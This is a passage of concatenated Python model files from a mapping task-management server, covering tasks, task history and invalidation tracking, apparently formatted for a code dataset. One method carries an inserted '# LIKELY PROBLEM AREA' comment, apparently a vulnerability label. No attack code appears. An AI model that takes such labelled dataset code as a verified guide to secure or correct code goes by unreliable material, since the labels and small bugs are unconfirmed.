total_tasks) * 100)\n\n    def as_dto_for_admin(self, project_id):\n        \"\"\" Creates a Project DTO suitable for transmitting to project admins \"\"\"\n        project, project_dto = self._get_project_and_base_dto()\n\n        if project is None:\n            return None\n\n        project_dto.project_info_locales = ProjectInfo.get_dto_for_all_locales(project_id)\n\n        return project_dto\n\n\n# Add index on project geometry\ndb.Index('idx_geometry', Project.geometry, postgresql_using='gist')\n/n/n/nserver/models/postgis/task.py/n/nimport bleach\nimport datetime\nimport geojson\nimport json\nfrom enum import Enum\nfrom flask import current_app\nfrom sqlalchemy import text\nfrom sqlalchemy.orm.exc import NoResultFound, MultipleResultsFound\nfrom sqlalchemy.orm.session import make_transient\nfrom geoalchemy2 import Geometry\nfrom server import db\nfrom typing import List\nfrom server.models.dtos.mapping_dto import TaskDTO, TaskHistoryDTO\nfrom server.models.dtos.task_annotation_dto import TaskAnnotationDTO \nfrom server.models.dtos.validator_dto import MappedTasksByUser, MappedTasks, InvalidatedTask, InvalidatedTasks\nfrom server.models.dtos.project_dto import ProjectComment, ProjectCommentsDTO\nfrom server.models.dtos.mapping_issues_dto import TaskMappingIssueDTO\nfrom server.models.postgis.statuses import TaskStatus, MappingLevel\nfrom server.models.postgis.user import User\nfrom server.models.postgis.utils import InvalidData, InvalidGeoJson, ST_GeomFromGeoJSON, ST_SetSRID, timestamp, parse_duration, NotFound\nfrom server.models.postgis.task_annotation import TaskAnnotation\n\n\nclass TaskAction(Enum):\n    \"\"\" Describes the possible actions that can happen to to a task, that we'll record history for \"\"\"\n    LOCKED_FOR_MAPPING = 1\n    LOCKED_FOR_VALIDATION = 2\n    STATE_CHANGE = 3\n    COMMENT = 4\n    AUTO_UNLOCKED_FOR_MAPPING = 5\n    AUTO_UNLOCKED_FOR_VALIDATION = 6\n\n\nclass TaskInvalidationHistory(db.Model):\n    \"\"\" Describes the most recent history of task invalidation and subsequent validation \"\"\"\n    __tablename__ = \"task_invalidation_history\"\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), nullable=False)\n    task_id = db.Column(db.Integer, nullable=False)\n    is_closed = db.Column(db.Boolean, default=False)\n    mapper_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_mappers'))\n    mapped_date = db.Column(db.DateTime)\n    invalidator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_invalidators'))\n    invalidated_date = db.Column(db.DateTime)\n    invalidation_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id', name='fk_invalidation_history'))\n    validator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_validators'))\n    validated_date = db.Column(db.DateTime)\n    updated_date = db.Column(db.DateTime, default=timestamp)\n\n    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),\n                      db.Index('idx_task_validation_history_composite', 'task_id', 'project_id'),\n                      db.Index('idx_task_validation_mapper_status_composite', 'invalidator_id', 'is_closed'),\n                      db.Index('idx_task_validation_mapper_status_composite', 'mapper_id', 'is_closed'),\n                      {})\n\n    def __init__(self, project_id, task_id):\n        self.project_id = project_id\n        self.task_id = task_id\n        self.is_closed = False\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @staticmethod\n    def get_open_for_task(project_id, task_id):\n        return TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False).one_or_none()\n\n    @staticmethod\n    def close_all_for_task(project_id, task_id):\n        TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False) \\\n                               .update({\"is_closed\": True})\n\n    @staticmethod\n    def record_invalidation(project_id, task_id, invalidator_id, history):\n        # Invalidation always kicks off a new entry for a task, so close any existing ones.\n        TaskInvalidationHistory.close_all_for_task(project_id, task_id)\n\n        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)\n        if last_mapped is None:\n            return\n\n        entry = TaskInvalidationHistory(project_id, task_id)\n        entry.invalidation_history_id = history.id\n        entry.mapper_id = last_mapped.user_id\n        entry.mapped_date = last_mapped.action_date\n        entry.invalidator_id = invalidator_id\n        entry.invalidated_date = history.action_date\n        entry.updated_date = timestamp()\n        db.session.add(entry)\n\n    @staticmethod\n    def record_validation(project_id, task_id, validator_id, history):\n        entry = TaskInvalidationHistory.get_open_for_task(project_id, task_id)\n\n        # If no open invalidation to update, then nothing to do\n        if entry is None:\n            return\n\n        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)\n        entry.mapper_id = last_mapped.user_id\n        entry.mapped_date = last_mapped.action_date\n        entry.validator_id = validator_id\n        entry.validated_date = history.action_date\n        entry.is_closed = True\n        entry.updated_date = timestamp()\n\n\nclass TaskMappingIssue(db.Model):\n    \"\"\" Describes an issue (along with an occurrence count) with a task mapping that contributed to invalidation of the task \"\"\"\n    __tablename__ = \"task_mapping_issues\"\n    id = db.Column(db.Integer, primary_key=True)\n    task_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id'), nullable=False, index=True)\n    issue = db.Column(db.String, nullable=False)\n    mapping_issue_category_id = db.Column(db.Integer, db.ForeignKey('mapping_issue_categories.id', name='fk_issue_category'), nullable=False)\n    count = db.Column(db.Integer, nullable=False)\n\n    def __init__(self, issue, count, mapping_issue_category_id, task_history_id=None):\n        self.task_history_id = task_history_id\n        self.issue = issue\n        self.count = count\n        self.mapping_issue_category_id = mapping_issue_category_id\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def as_dto(self):\n        issue_dto = TaskMappingIssueDTO()\n        issue_dto.category_id = self.mapping_issue_category_id\n        issue_dto.name = self.issue\n        issue_dto.count = self.count\n        return issue_dto\n\n    def __repr__(self):\n        return \"{0}: {1}\".format(self.issue, self.count)\n\n\nclass TaskHistory(db.Model):\n    \"\"\" Describes the history associated with a task \"\"\"\n    __tablename__ = \"task_history\"\n\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)\n    task_id = db.Column(db.Integer, nullable=False)\n    action = db.Column(db.String, nullable=False)\n    action_text = db.Column(db.String)\n    action_date = db.Column(db.DateTime, nullable=False, default=timestamp)\n    user_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)\n    invalidation_history = db.relationship(TaskInvalidationHistory, lazy='dynamic', cascade='all')\n\n    actioned_by = db.relationship(User)\n    task_mapping_issues = db.relationship(TaskMappingIssue, cascade=\"all\")\n\n    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),\n                      db.Index('idx_task_history_composite', 'task_id', 'project_id'), {})\n\n    def __init__(self, task_id, project_id, user_id):\n        self.task_id = task_id\n        self.project_id = project_id\n        self.user_id = user_id\n\n    def set_task_locked_action(self, task_action: TaskAction):\n        if task_action not in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:\n            raise ValueError('Invalid Action')\n\n        self.action = task_action.name\n\n    def set_comment_action(self, comment):\n        self.action = TaskAction.COMMENT.name\n        clean_comment = bleach.clean(comment)  # Bleach input to ensure no nefarious script tags etc\n        self.action_text = clean_comment\n\n    def set_state_change_action(self, new_state):\n        self.action = TaskAction.STATE_CHANGE.name\n        self.action_text = new_state.name\n\n    def set_auto_unlock_action(self, task_action: TaskAction):\n        self.action = task_action.name\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @staticmethod\n    def update_task_locked_with_duration(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):\n        \"\"\"\n        Calculates the duration a task was locked for and sets it on the history record\n        :param task_id: Task in scope\n        :param project_id: Project ID in scope\n        :param lock_action: The lock action, either Mapping or Validation\n        :param user_id: Logged in user updating the task\n        :return:\n        \"\"\"\n        try:\n            last_locked = TaskHistory.query.filter_by(task_id=task_id, project_id=project_id, action=lock_action.name,\n                                                      action_text=None, user_id=user_id).one()\n        except NoResultFound:\n            # We suspect there's some kind or race condition that is occasionally deleting history records\n            # prior to user unlocking task. Most likely stemming from auto-unlock feature. However, given that\n            # we're trying to update a row that doesn't exist, it's better to return without doing anything\n            # rather than showing the user an error that they can't fix\n            return\n        except MultipleResultsFound:\n            # Again race conditions may mean we have multiple rows within the Task History.  Here we attempt to\n            # remove the oldest duplicate rows, and update the newest on the basis that this was the last action\n            # the user was attempting to make.\n            TaskHistory.remove_duplicate_task_history_rows(task_id, project_id, lock_action, user_id)\n\n            # Now duplicate is removed, we recursively call ourself to update the duration on the remaining row\n            TaskHistory.update_task_locked_with_duration(task_id, project_id, lock_action, user_id)\n            return\n\n        duration_task_locked = datetime.datetime.utcnow() - last_locked.action_date\n        # Cast duration to isoformat for later transmission via api\n        last_locked.action_text = (datetime.datetime.min + duration_task_locked).time().isoformat()\n        db.session.commit()\n\n    @staticmethod\n    def remove_duplicate_task_history_rows(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):\n        \"\"\" Method used in rare cases where we have duplicate task history records for a given action by a user\n            This method will remove the oldest duplicate record, on the basis that the newest record was the\n            last action the user was attempting to perform\n        \"\"\"\n        dupe = TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id,\n                                        TaskHistory.action == lock_action.name,\n                                        TaskHistory.user_id == user_id).order_by(TaskHistory.id.asc()).first()\n\n        dupe.delete()\n\n    @staticmethod\n    def update_expired_and_locked_actions(project_id: int, task_id: int, expiry_date: datetime, action_text: str):\n        \"\"\"\n        Sets auto unlock state to all not finished actions, that are older then the expiry date.\n        Action is considered as a not finished, when it is in locked state and doesn't have action text\n        :param project_id: Project ID in scope\n        :param task_id: Task in scope\n        :param expiry_date: Action created before this date is treated as expired\n        :param action_text: Text which will be set for all changed actions\n        :return:\n        \"\"\"\n        all_expired = TaskHistory.query.filter(\n            TaskHistory.task_id == task_id,\n            TaskHistory.project_id == project_id,\n            TaskHistory.action_text.is_(None),\n            TaskHistory.action.in_([TaskAction.LOCKED_FOR_VALIDATION.name, TaskAction.LOCKED_FOR_MAPPING.name]),\n            TaskHistory.action_date <= expiry_date).all()\n\n        for task_history in all_expired:\n            unlock_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if task_history.action == 'LOCKED_FOR_MAPPING' \\\n                else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION\n\n            task_history.set_auto_unlock_action(unlock_action)\n            task_history.action_text = action_text\n\n        db.session.commit()\n\n    @staticmethod\n    def get_all_comments(project_id: int) -> ProjectCommentsDTO:\n        \"\"\" Gets all comments for the supplied project_id\"\"\"\n\n        comments = db.session.query(TaskHistory.task_id,\n                                    TaskHistory.action_date,\n                                    TaskHistory.action_text,\n                                    User.username) \\\n            .join(User) \\\n            .filter(TaskHistory.project_id == project_id, TaskHistory.action == TaskAction.COMMENT.name).all()\n\n        comments_dto = ProjectCommentsDTO()\n        for comment in comments:\n            dto = ProjectComment()\n            dto.comment = comment.action_text\n            dto.comment_date = comment.action_date\n            dto.user_name = comment.username\n            dto.task_id = comment.task_id\n            comments_dto.comments.append(dto)\n\n        return comments_dto\n\n    @staticmethod\n    def get_last_status(project_id: int, task_id: int, for_undo: bool = False):\n        \"\"\" Get the status the task was set to the last time the task had a STATUS_CHANGE\"\"\"\n        result = db.session.query(TaskHistory.action_text) \\\n            .filter(TaskHistory.project_id == project_id,\n                    TaskHistory.task_id == task_id,\n                    TaskHistory.action == TaskAction.STATE_CHANGE.name) \\\n            .order_by(TaskHistory.action_date.desc()).all()\n\n        if not result:\n            return TaskStatus.READY  # No result so default to ready status\n\n        if len(result) == 1 and for_undo:\n            # We're looking for the previous status, however, there isn't any so we'll return Ready\n            return TaskStatus.READY\n\n        if for_undo and result[0][0] in [TaskStatus.MAPPED.name, TaskStatus.BADIMAGERY.name]:\n            # We need to return a READY when last status of the task is badimagery or mapped.\n            return TaskStatus.READY\n\n        if for_undo:\n            # Return the second last status which was status the task was previously set to\n            return TaskStatus[result[1][0]]\n        else:\n            return TaskStatus[result[0][0]]\n\n    @staticmethod\n    def get_last_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record for the task\"\"\"\n        return TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n    @staticmethod\n    def get_last_action_of_type(project_id: int, task_id: int, allowed_task_actions: list):\n        \"\"\"Gets the most recent task history record having provided TaskAction\"\"\"\n        return TaskHistory.query.filter(TaskHistory.project_id == project_id,\n                                        TaskHistory.task_id == task_id,\n                                        TaskHistory.action.in_(allowed_task_actions)) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n    @staticmethod\n    def get_last_locked_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record with locked action for the task\"\"\"\n        return TaskHistory.get_last_action_of_type(\n            project_id, task_id,\n            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name])\n\n    @staticmethod\n    def get_last_locked_or_auto_unlocked_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent task history record with locked or auto unlocked action for the task\"\"\"\n        return TaskHistory.get_last_action_of_type(\n            project_id, task_id,\n            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name,\n             TaskAction.AUTO_UNLOCKED_FOR_MAPPING.name, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION.name])\n\n    def get_last_mapped_action(project_id: int, task_id: int):\n        \"\"\"Gets the most recent mapped action, if any, in the task history\"\"\"\n        return db.session.query(TaskHistory) \\\n            .filter(TaskHistory.project_id == project_id,\n                    TaskHistory.task_id == task_id,\n                    TaskHistory.action == TaskAction.STATE_CHANGE.name,\n                    TaskHistory.action_text.in_([TaskStatus.BADIMAGERY.name, TaskStatus.MAPPED.name])) \\\n            .order_by(TaskHistory.action_date.desc()).first()\n\n\nclass Task(db.Model):\n    \"\"\" Describes an individual mapping Task \"\"\"\n    __tablename__ = \"tasks\"\n\n    # Table has composite PK on (id and project_id)\n    id = db.Column(db.Integer, primary_key=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True, primary_key=True)\n    x = db.Column(db.Integer)\n    y = db.Column(db.Integer)\n    zoom = db.Column(db.Integer)\n    extra_properties = db.Column(db.Unicode)\n    # Tasks need to be split differently if created from an arbitrary grid or were clipped to the edge of the AOI\n    is_square = db.Column(db.Boolean, default=True)\n    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))\n    task_status = db.Column(db.Integer, default=TaskStatus.READY.value)\n    locked_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_locked'))\n    mapped_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_mapper'))\n    validated_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_validator'))\n\n    # Mapped objects\n    task_history = db.relationship(TaskHistory, cascade=\"all\")\n    task_annotations = db.relationship(TaskAnnotation, cascade=\"all\")\n    lock_holder = db.relationship(User, foreign_keys=[locked_by])\n    mapper = db.relationship(User, foreign_keys=[mapped_by])\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def update(self):\n        \"\"\" Updates the DB with the current state of the Task \"\"\"\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    @classmethod\n    def from_geojson_feature(cls, task_id, task_feature):\n        \"\"\"\n        Constructs and validates a task from a GeoJson feature object\n        :param task_id: Unique ID for the task\n        :param task_feature: A geoJSON feature object\n        :raises InvalidGeoJson, InvalidData\n        \"\"\"\n        if type(task_feature) is not geojson.Feature:\n            raise InvalidGeoJson('Task: Invalid GeoJson should be a feature')\n\n        task_geometry = task_feature.geometry\n\n        if type(task_geometry) is not geojson.MultiPolygon:\n            raise InvalidGeoJson('Task: Geometry must be a MultiPolygon')\n\n        is_valid_geojson = geojson.is_valid(task_geometry)\n        if is_valid_geojson['valid'] == 'no':\n            raise InvalidGeoJson(f\"Task: Invalid MultiPolygon - {is_valid_geojson['message']}\")\n\n        task = cls()\n        try:\n            task.x = task_feature.properties['x']\n            task.y = task_feature.properties['y']\n            task.zoom = task_feature.properties['zoom']\n            task.is_square = task_feature.properties['isSquare']\n        except KeyError as e:\n            raise InvalidData(f'Task: Expected property not found: {str(e)}')\n\n        if 'extra_properties' in task_feature.properties:\n            task.extra_properties = json.dumps(\n                task_feature.properties['extra_properties'])\n\n        task.id = task_id\n        task_geojson = geojson.dumps(task_geometry)\n        task.geometry = ST_SetSRID(ST_GeomFromGeoJSON(task_geojson), 4326)\n\n        return task\n\n    @staticmethod\n    def get(task_id: int, project_id: int):\n        \"\"\"\n        Gets specified task\n        :param task_id: task ID in scope\n        :param project_id: project ID in scope\n        :return: Task if found otherwise None\n        \"\"\"\n        # LIKELY PROBLEM AREA\n\n        return Task.query.filter_by(id=task_id, project_id=project_id).one_or_none()\n\n    @staticmethod\n    def get_tasks(project_id: int, task_ids: List[int]):\n        \"\"\" Get all tasks that match supplied list \"\"\"\n        return Task.query.filter(Task.project_id == project_id, Task.id.in_(task_ids)).all()\n\n    @staticmethod\n    def get_all_tasks(project_id: int):\n        \"\"\" Get all tasks for a given project \"\"\"\n        return Task.query.filter(Task.project_id == project_id).all()\n\n    @staticmethod\n    def auto_unlock_delta():\n      return parse_duration(current_app.config['TASK_AUTOUNLOCK_AFTER'])\n\n    @staticmethod\n    def auto_unlock_tasks(project_id: int):\n        \"\"\"Unlock all tasks locked for longer than the auto-unlock delta\"\"\"\n        expiry_delta = Task.auto_unlock_delta()\n        lock_duration = (datetime.datetime.min + expiry_delta).time().isoformat()\n        expiry_date = datetime.datetime.utcnow() - expiry_delta\n        old_locks_query = '''SELECT t.id\n            FROM tasks t, task_history th\n            WHERE t.id = th.task_id\n            AND t.project_id = th.project_id\n            AND t.task_status IN (1,3)\n            AND th.action IN ( 'LOCKED_FOR_VALIDATION','LOCKED_FOR_MAPPING' )\n            AND th.action_text IS NULL\n            AND t.project_id = :project_id\n            AND th.action_date <= :expiry_date\n            '''\n\n        old_tasks = db.engine.execute(text(old_locks_query), project_id=project_id, expiry_date=str(expiry_date))\n\n        if old_tasks.rowcount == 0:\n            # no tasks older than the delta found, return without further processing\n            return\n\n        for old_task in old_tasks:\n            task = Task.get(old_task[0], project_id)\n            task.auto_unlock_expired_tasks(expiry_date, lock_duration)\n\n    def auto_unlock_expired_tasks(self, expiry_date, lock_duration):\n        \"\"\"Unlock all tasks locked before expiry date. Clears task lock if needed\"\"\"\n        TaskHistory.update_expired_and_locked_actions(self.project_id, self.id, expiry_date, lock_duration)\n\n        last_action = TaskHistory.get_last_locked_or_auto_unlocked_action(self.project_id, self.id)\n        if last_action.action in ['AUTO_UNLOCKED_FOR_MAPPING', 'AUTO_UNLOCKED_FOR_VALIDATION']:\n            self.clear_lock()\n\n    def is_mappable(self):\n        \"\"\" Determines if task in scope is in suitable state for mapping \"\"\"\n        if TaskStatus(self.task_status) not in [TaskStatus.READY, TaskStatus.INVALIDATED]:\n            return False\n\n        return True\n\n    def set_task_history(self, action, user_id, comment=None, new_state=None, mapping_issues=None):\n        \"\"\"\n        Sets the task history for the action that the user has just performed\n        :param task: Task in scope\n        :param user_id: ID of user performing the action\n        :param action: Action the user has performed\n        :param comment: Comment user has added\n        :param new_state: New state of the task\n        :param mapping_issues: Identified issues leading to invalidation\n        \"\"\"\n        history = TaskHistory(self.id, self.project_id, user_id)\n\n        if action in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:\n            history.set_task_locked_action(action)\n        elif action == TaskAction.COMMENT:\n            history.set_comment_action(comment)\n        elif action == TaskAction.STATE_CHANGE:\n            history.set_state_change_action(new_state)\n        elif action in [TaskAction.AUTO_UNLOCKED_FOR_MAPPING, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION]:\n            history.set_auto_unlock_action(action)\n\n        if mapping_issues is not None:\n            history.task_mapping_issues = mapping_issues\n\n        self.task_history.append(history)\n        return history\n\n    def lock_task_for_mapping(self, user_id: int):\n        self.set_task_history(TaskAction.LOCKED_FOR_MAPPING, user_id)\n        self.task_status = TaskStatus.LOCKED_FOR_MAPPING.value\n        self.locked_by = user_id\n        self.update()\n\n    def lock_task_for_validating(self, user_id: int):\n        self.set_task_history(TaskAction.LOCKED_FOR_VALIDATION, user_id)\n        self.task_status = TaskStatus.LOCKED_FOR_VALIDATION.value\n        self.locked_by = user_id\n        self.update()\n\n    def reset_task(self, user_id: int):\n        if TaskStatus(self.task_status) in [TaskStatus.LOCKED_FOR_MAPPING, TaskStatus.LOCKED_FOR_VALIDATION]:\n            self.record_auto_unlock()\n\n        self.set_task_history(TaskAction.STATE_CHANGE, user_id, None, TaskStatus.READY)\n        self.mapped_by = None\n        self.validated_by = None\n        self.locked_by = None\n        self.task_status = TaskStatus.READY.value\n        self.update()\n\n    def clear_task_lock(self):\n        \"\"\"\n        Unlocks task in scope in the database.  Clears the lock as though it never happened.\n        No history of the unlock is recorded.\n        :return:\n        \"\"\"\n        # clear the lock action for the task in the task history\n        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)\n        last_action.delete()\n\n        # Set locked_by to null and status to last status on task\n        self.clear_lock()\n\n    def record_auto_unlock(self, lock_duration):\n        locked_user = self.locked_by\n        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)\n        next_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if last_action.action == 'LOCKED_FOR_MAPPING' \\\n            else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION\n\n        self.clear_task_lock()\n\n        # Add AUTO_UNLOCKED action in the task history\n        auto_unlocked = self.set_task_history(action=next_action, user_id=locked_user)\n        auto_unlocked.action_text = lock_duration\n        self.update()\n\n    def unlock_task(self, user_id, new_state=None, comment=None, undo=False, issues=None):\n        \"\"\" Unlock task and ensure duration task locked is saved in History \"\"\"\n        if comment:\n            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id, mapping_issues=issues)\n\n        history = self.set_task_history(action=TaskAction.STATE_CHANGE, new_state=new_state,\n                                        user_id=user_id, mapping_issues=issues)\n\n        if new_state in [TaskStatus.MAPPED, TaskStatus.BADIMAGERY] and TaskStatus(self.task_status) != TaskStatus.LOCKED_FOR_VALIDATION:\n            # Don't set mapped if state being set back to mapped after validation\n            self.mapped_by = user_id\n        elif new_state == TaskStatus.VALIDATED:\n            TaskInvalidationHistory.record_validation(self.project_id, self.id, user_id, history)\n            self.validated_by = user_id\n        elif new_state == TaskStatus.INVALIDATED:\n            TaskInvalidationHistory.record_invalidation(self.project_id, self.id, user_id, history)\n            self.mapped_by = None\n            self.validated_by = None\n\n        if not undo:\n            # Using a slightly evil side effect of Actions and Statuses having the same name here :)\n            TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)\n\n        self.task_status = new_state.value\n        self.locked_by = None\n        self.update()\n\n    def reset_lock(self, user_id, comment=None):\n        \"\"\" Removes a current lock from a task, resets to last status and updates history with duration of lock \"\"\"\n        if comment:\n            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id)\n\n        # Using a slightly evil side effect of Actions and Statuses having the same name here :)\n        TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)\n        self.clear_lock()\n\n    def clear_lock(self):\n        \"\"\" Resets to last status and removes current lock from a task \"\"\"\n        self.task_status = TaskHistory.get_last_status(self.project_id, self.id).value\n        self.locked_by = None\n        self.update()\n\n    @staticmethod\n    def get_tasks_as_geojson_feature_collection(project_id):\n        \"\"\"\n        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID\n        :param project_id: Owning project ID\n        :return: geojson.FeatureCollection\n        \"\"\"\n        project_tasks = \\\n            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status,\n                             Task.geometry.ST_AsGeoJSON().label('geojson')).filter(Task.project_id == project_id).all()\n\n        tasks_features = []\n        for task in project_tasks:\n            task_geometry = geojson.loads(task.geojson)\n            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,\n                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)\n\n            feature = geojson.Feature(geometry=task_geometry, properties=task_properties)\n            tasks_features.append(feature)\n\n        return geojson.FeatureCollection(tasks_features)\n\n    @staticmethod\n    def get_tasks_as_geojson_feature_collection_no_geom(project_id):\n        \"\"\"\n        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID without geometry\n        :param project_id: Owning project ID\n        :return: geojson.FeatureCollection\n        \"\"\"\n        project_tasks = \\\n            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status) \\\n                             .filter(Task.project_id == project_id).all()\n\n        tasks_features = []\n        for task in project_tasks:\n            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,\n                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)\n\n            feature = geojson.Feature(properties=task_properties)\n            tasks_features.append(feature)\n\n        return geojson.FeatureCollection(tasks_features)\n\n    @staticmethod\n    def get_mapped_tasks_by_user(project_id: int):\n        \"\"\" Gets all mapped tasks for supplied project grouped by user\"\"\"\n\n        # Raw SQL is easier to understand that SQL alchemy here :)\n        sql = \"\"\"select u.username, u.mapping_level, count(distinct(t.id)), json_agg(distinct(t.id)),\n                            max(th.action_date) last_seen, u.date_registered, u.last_validation_date\n                      from tasks t,\n                           task_history th,\n                           users u\n                     where t.project_id = th.project_id\n                       and t.id = th.task_id\n                       and t.mapped_by = u.id\n                       and t.project_id = :project_id\n                       and t.task_status = 2\n                       and th.action_text = 'MAPPED'\n                     group by u.username, u.mapping_level, u.date_registered, u.last_validation_date\"\"\"\n\n        results = db.engine.execute(text(sql), project_id=project_id)\n        if results.rowcount == 0:\n            raise NotFound()\n\n        mapped_tasks_dto = MappedTasks()\n        for row in results:\n            user_mapped = MappedTasksByUser()\n            user_mapped.username = row[0]\n            user_mapped.mapping_level = MappingLevel(row[1]).name\n            user_mapped.mapped_task_count = row[2]\n            user_mapped.tasks_mapped = row[3]\n            user_mapped.last_seen = row[4]\n            user_mapped.date_registered = row[5]\n            user_mapped.last_validation_date = row[6]\n\n            mapped_tasks_dto.mapped_tasks.append(user_mapped)\n\n        return mapped_tasks_dto\n\n    @staticmethod\n    def get_max_task_id_for_project(project_id: int):\n        \"\"\"Gets the nights task id currently in use on a project\"\"\"\n        sql = \"\"\"select max(id) from tasks where project_id = :project_id GROUP BY project_id\"\"\"\n        result = db.engine.execute(text(sql), project_id=project_id)\n        if result.rowcount == 0:\n            raise NotFound()\n        for row in result:\n            return row[0]\n\n    def as_dto_with_instructions(self, preferred_locale: str = 'en') -> TaskDTO:\n        \"\"\" Get dto with any task instructions \"\"\"\n        task_history = []\n        for action in self.task_history:\n            history = TaskHistoryDTO()\n            history.history_id = action.id\n            history.action = action.action\n            history.action_text = action.action_text\n            history.action_date = action.action_date\n            history.action_by = action.actioned_by.username if action.actioned_by else None\n            if action.task_mapping_issues:\n                history.issues = [issue.as_dto() for issue in action.task_mapping_issues]\n\n            task_history.append(history)\n\n        task_dto = TaskDTO()\n        task_dto.task_id = self.id\n        task_dto.project_id = self.project_id\n        task_dto.task_status = TaskStatus(self.task_status).name\n        task_dto.lock_holder = self.lock_holder.username if self.lock_holder else None\n        task_dto.task_history = task_history\n        task_dto.auto_unlock_seconds = Task.auto_unlock_delta().total_seconds()\n\n        per_task_instructions = self.get_per_task_instructions(preferred_locale)\n\n        # If we don't have instructions in preferred locale try again for default locale\n        task_dto.per_task_instructions = per_task_instructions if per_task_instructions else self.get_per_task_instructions(\n            self.projects.default_locale)\n\n        annotations = self.get_per_task_annotations()\n        task_dto.task_annotations = annotations if annotations else  [] \n\n        return task_dto\n\n    def get_per_task_annotations(self):\n        result = [ta.get_dto() for ta in self.task_annotations]\n        return result\n\n    def get_per_task_instructions(self, search_locale: str) -> str:\n        \"\"\" Gets any per task instructions attached to the project \"\"\"\n        project_info = self.projects.project_info.all()\n\n        for info in project_info:\n            if info.locale == search_locale:\n                return self.format_per_task_instructions(info.per_task_instructions)\n\n    def format_per_task_instructions(self, instructions) -> str:\n        \"\"\" Format instructions by looking for X, Y, Z tokens and replacing them with the task values \"\"\"\n        if not instructions:\n            return ''  # No instructions so return empty string\n\n        properties = {}\n\n        if self.x:\n            properties['x'] = str(self.x)\n        if self.y:\n            properties['y'] = str(self.y)\n        if self.zoom:\n            properties['z'] = str(self.zoom)\n        if self.extra_properties:\n            properties.update(json.loads(self.extra_properties))\n\n        try:\n            instructions = instructions.format(**properties)\n        except KeyError:\n            pass\n        return instructions\n\n    def copy_task_history(self) -> list:\n        copies = []\n        for entry in self.task_history:\n            db.session.expunge(entry)\n            make_transient(entry)\n            entry.id = None\n            entry.task_id = None\n            db.session.add(entry)\n            copies.append(entry)\n\n        return copies\n/n/n/nserver/models/postgis/user.py/n/nimport geojson\nimport datetime\nimport dateutil.parser\nfrom server import db\nfrom sqlalchemy import desc, text\nfrom server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \\\n    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser\nfrom server.models.postgis.licenses import License, users_licenses_table\nfrom server.models.postgis.project_info import ProjectInfo\nfrom server.models.postgis.statuses import MappingLevel, 